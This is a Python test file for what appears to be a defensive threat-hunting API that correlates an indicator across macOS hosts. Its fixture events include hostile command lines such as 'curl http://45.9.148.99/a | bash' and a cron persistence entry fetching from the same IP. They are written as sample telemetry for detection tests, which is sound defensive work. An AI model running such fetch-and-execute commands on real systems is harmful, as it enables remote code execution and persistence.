# SPDX-License-Identifier: GPL-3.0-or-later
"""Cross-host IOC hunt correlates an indicator across the whole fleet."""
from fastapi.testclient import TestClient

from raptorscope.api.app import create_app
from raptorscope.api.store import InMemoryStore


def _mk(host, ds, extra):
    d = {
        "host": {"name": host, "os": {"type": "macos"}},
        "event": {"dataset": ds, "category": ["x"]},
        "@timestamp": "2026-07-01T00:00:00Z",
    }
    d.update(extra)
    return d


def _docs():
    return [
        _mk("host-a", "macos.process",
            {"process": {"command_line": "curl http://45.9.148.99/a | bash"}}),
        _mk("host-b", "macos.persistence",
            {"process": {"command_line": "bash -c curl http://45.9.148.99/x"},
             "raptorscope": {"persistence": {"type": "cron"}}}),
        _mk("host-b", "macos.tcc",
            {"raptorscope": {"tcc": {"client": "/Users/Shared/.helper/agent"}}}),
        _mk("host-c", "macos.process", {"process": {"command_line": "/Applications/Safari"}}),
    ]


def _client():
    return TestClient(create_app(InMemoryStore(_docs())))


def test_hunt_correlates_an_ip_across_hosts():
    body = _client().get("/hunt?q=45.9.148.99").json()
    assert body["total"] == 2
    assert body["host_count"] == 2
    assert {h["host"] for h in body["hosts"]} == {"host-a", "host-b"}
    # each host entry carries a count, datasets, and pivotable samples
    a = next(h for h in body["hosts"] if h["host"] == "host-a")
    assert a["count"] == 1
    assert a["samples"][0]["doc_id"] is not None


def test_hunt_by_tcc_client_path():
    body = _client().get("/hunt?q=/Users/Shared/.helper/agent").json()
    assert {h["host"] for h in body["hosts"]} == {"host-b"}


def test_hunt_no_match_and_empty_query():
    c = _client()
    assert c.get("/hunt?q=203.0.113.9").json()["total"] == 0
    assert c.get("/hunt?q=%20%20").json()["total"] == 0
